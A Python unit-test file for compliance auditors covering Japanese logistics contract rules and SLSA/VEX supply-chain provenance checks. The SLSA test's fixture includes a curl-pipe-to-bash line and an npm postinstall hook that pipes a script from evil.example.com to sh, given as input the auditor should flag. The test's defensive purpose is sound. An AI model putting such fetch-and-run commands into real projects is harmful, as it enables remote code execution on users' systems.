"""Unit tests for Wave 16 Actors #35-#36, Track 7 Logistics CLI #14, and Track 5 17-gate CLI."""

from __future__ import annotations

import csv
import json
from pathlib import Path

from tracks.track1_apify.jp_butsuryu_unso_2025_actor.main import (
    audit_butsuryu_contract_batch,
    evaluate_butsuryu_thresholds,
)
from tracks.track1_apify.supplychain_slsa_vex_actor.main import (
    audit_slsa_provenance_batch,
    audit_slsa_provenance_item,
)
from tracks.track5_direct_sales.booth_pro_pack.batch_compliance_suite_cli import (
    run_offline_compliance_audit,
)
from tracks.track7_freelance_kit.deliverables.logistics_butsuryu_2025_auditor import (
    audit_butsuryu_csv,
)


def test_actor35_logistics_efficiency_and_2024_driver_cap_auditor() -> None:
    bad_t = evaluate_butsuryu_thresholds(
        annual_cargo_tons=115000,
        has_clo_appointed=False,
        contract_fare_jpy=38000,
        standard_tariff_jpy=52000,
        wait_and_handling_hours=3.5,
        monthly_binding_hours=325,
        daily_rest_hours=8.0,
        subcontract_tier=3,
    )
    assert bad_t["specific_shipper_required"] is True
    assert bad_t["clo_missing_violation"] is True
    assert bad_t["below_standard_tariff"] is True
    assert bad_t["excessive_wait_handling"] is True
    assert bad_t["driver_rest_or_binding_breach"] is True
    assert bad_t["deep_subcontract_risk"] is True

    compliant_text = "\n".join(
        [
            "配車前に配送指示書および運送契約書を書面交付する。",
            "標準的運賃と燃料サーチャージを別建て精算する。",
            "バース予約とパレット化により荷待ち・荷役2時間以内を遵守する。",
            "特定荷主として物流統括管理者(CLO)を選任し中長期計画を作成する。",
            "実運送体制管理簿を作成し再委託制限により2次請け以内に抑える。",
            "改善基準告示（拘束時間・休息期間・960時間）を遵守する。",
            "待機時間料および附帯作業料を別途有償請求する。",
            "乗務記録・点呼記録・待機ログを2年保存する。",
        ]
    )

    batch = audit_butsuryu_contract_batch(
        [
            {
                "org_name": "Risky Shipper",
                "annual_cargo_tons": 115000,
                "has_clo_appointed": False,
                "contract_fare_jpy": 38000,
                "standard_tariff_jpy": 52000,
                "wait_and_handling_hours": 3.5,
                "monthly_binding_hours": 325,
                "daily_rest_hours": 8.0,
                "subcontract_tier": 3,
                "contract_text": "口頭配車で附帯作業費は運賃込み、3次下請を許容する。",
            },
            {
                "org_name": "Compliant Shipper",
                "annual_cargo_tons": 115000,
                "has_clo_appointed": True,
                "contract_fare_jpy": 53000,
                "standard_tariff_jpy": 52000,
                "wait_and_handling_hours": 1.5,
                "monthly_binding_hours": 260,
                "daily_rest_hours": 11.0,
                "subcontract_tier": 2,
                "contract_text": compliant_text,
            },
        ]
    )
    assert batch[0]["status"] == "fail"
    bad_rules = {f["rule_id"] for f in batch[0]["findings"]}
    assert {
        "BUTSURYU-CLO-MISSING",
        "BUTSURYU-TARIFF-UNDERCUT",
        "BUTSURYU-WAIT-OVER-2H",
        "BUTSURYU-DRIVER-REST-BREACH",
        "BUTSURYU-DEEP-TIER-SUBCONTRACT",
    }.issubset(bad_rules)

    assert batch[1]["score"] == 100
    assert batch[1]["status"] == "pass"


def test_actor36_slsa_vex_provenance_auditor() -> None:
    unsafe_manifest = """
    curl -sSL https://cdn.example.com/install.sh | bash
    {"scripts": {"postinstall": "wget -qO- https://evil.example.com/p.sh | sh"}}
    {"verify_sig": false, "source_digest": null, "image": "ghcr.io/org/app:latest"}
    {"vex_status": "not_affected"}
    """
    bad = audit_slsa_provenance_item(unsafe_manifest, artifact_name="bad-cli")
    assert bad["status"] == "high_risk"
    assert set(bad["rule_ids"]) == {
        "SLSA-PIPE-01",
        "SLSA-NPM-HOOK-02",
        "SLSA-SIG-03",
        "SLSA-TAG-04",
        "SLSA-LVL-05",
        "SLSA-VEX-06",
    }

    safe_manifest = json.dumps(
        {
            "slsa_level": 3,
            "source_digest": "git+sha1:deadbeefcafebabe1234567890",
            "verify_sig": True,
            "provenance": True,
            "action_ref": "actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332",
            "vex_status": "not_affected",
            "justification": "vulnerable_code_not_in_execute_path",
            "scripts": {"build": "tsc --noEmit"},
        }
    )
    good = audit_slsa_provenance_batch(
        [{"artifact_name": "safe-cli", "config_or_manifest_text": safe_manifest}]
    )
    assert good[0]["status"] == "pass"
    assert good[0]["score"] == 100
    assert good[0]["findings_count"] == 0


def test_track7_logistics_butsuryu_2025_auditor(tmp_path: Path) -> None:
    in_csv = tmp_path / "lanes.csv"
    out_csv = tmp_path / "audited.csv"
    out_json = tmp_path / "audited.json"

    compliant_text = (
        "配送指示書 書面交付 標準的運賃 燃料サーチャージ バース予約 荷待ち 2時間以内 "
        "特定荷主 物流統括管理者 CLO 実運送体制管理簿 2次請け 改善基準告示 待機時間料 乗務記録 2年保存"
    )

    with in_csv.open("w", encoding="utf-8", newline="") as f:
        writer = csv.DictWriter(
            f,
            fieldnames=[
                "org_name",
                "annual_cargo_tons",
                "has_clo_appointed",
                "contract_fare_jpy",
                "standard_tariff_jpy",
                "wait_and_handling_hours",
                "monthly_binding_hours",
                "daily_rest_hours",
                "subcontract_tier",
                "butsuryu_contract_text",
            ],
        )
        writer.writeheader()
        writer.writerow(
            {
                "org_name": "Clean Lane A",
                "annual_cargo_tons": "95000",
                "has_clo_appointed": "true",
                "contract_fare_jpy": "52000",
                "standard_tariff_jpy": "52000",
                "wait_and_handling_hours": "1.5",
                "monthly_binding_hours": "250",
                "daily_rest_hours": "11.0",
                "subcontract_tier": "2",
                "butsuryu_contract_text": compliant_text,
            }
        )
        writer.writerow(
            {
                "org_name": "Gmen Risk Lane B",
                "annual_cargo_tons": "120000",
                "has_clo_appointed": "false",
                "contract_fare_jpy": "36000",
                "standard_tariff_jpy": "52000",
                "wait_and_handling_hours": "3.2",
                "monthly_binding_hours": "322",
                "daily_rest_hours": "8.0",
                "subcontract_tier": "3",
                "butsuryu_contract_text": "口頭配車。附帯作業費は運賃込み。3次下請を許容。",
            }
        )

    res = audit_butsuryu_csv(in_csv, out_csv, out_json)
    assert res["network_calls"] == 0
    assert res["total_lanes"] == 2
    assert res["clo_missing_lanes"] == 1
    assert res["tariff_undercut_lanes"] == 1
    assert res["wait_over_2h_lanes"] == 1
    assert res["driver_breach_lanes"] == 1
    assert res["rows"][0]["audit_status"] == "pass"
    assert res["rows"][1]["audit_status"] == "fail"
    assert out_csv.exists()
    assert out_json.exists()


def test_track5_seventeen_gate_cli_audits_butsuryu_contract() -> None:
    report = run_offline_compliance_audit(
        [
            {
                "text": "新規幹線輸送ルート契約確認",
                "invoice_id": "T7000012050002",
                "payee_name": "カントウウンユカブシキガイシャ",
                "annual_cargo_tons": "110000",
                "has_clo_appointed": "false",
                "contract_fare_jpy": "38000",
                "standard_tariff_jpy": "50000",
                "wait_and_handling_hours": "3.0",
                "monthly_binding_hours": "320",
                "daily_rest_hours": "8.5",
                "subcontract_tier": "3",
                "butsuryu_contract_text": "口頭配車。附帯作業費は運賃込み。",
            }
        ]
    )
    assert report["network_calls"] == 0
    assert report["butsuryu_flagged_rows"] == 1
    assert report["rows"][0]["butsuryu_audit"]["status"] == "fail"
    assert report["rows"][0]["butsuryu_audit"]["thresholds"]["clo_missing_violation"] is True
    assert report["rows"][0]["butsuryu_audit"]["thresholds"]["excessive_wait_handling"] is True


def test_all_36_apify_actor_input_schemas_have_required_descriptions() -> None:
    schema_paths = sorted(Path("tracks/track1_apify").glob("*/.actor/input_schema.json"))
    assert len(schema_paths) >= 36
    for schema_path in schema_paths:
        data = json.loads(schema_path.read_text(encoding="utf-8"))
        assert str(data.get("title") or "").strip(), schema_path
        assert data.get("type") == "object", schema_path
        assert data.get("schemaVersion") == 1, schema_path
        props = data.get("properties")
        assert isinstance(props, dict) and props, schema_path
        for key, prop in props.items():
            assert isinstance(prop, dict), f"{schema_path}:{key}"
            assert str(prop.get("title") or "").strip(), f"{schema_path}:{key} missing title"
            assert str(prop.get("type") or "").strip(), f"{schema_path}:{key} missing type"
            assert str(prop.get("description") or "").strip(), f"{schema_path}:{key} missing description"
            if prop.get("type") in {"array", "object"}:
                assert str(prop.get("editor") or "").strip(), f"{schema_path}:{key} missing editor"
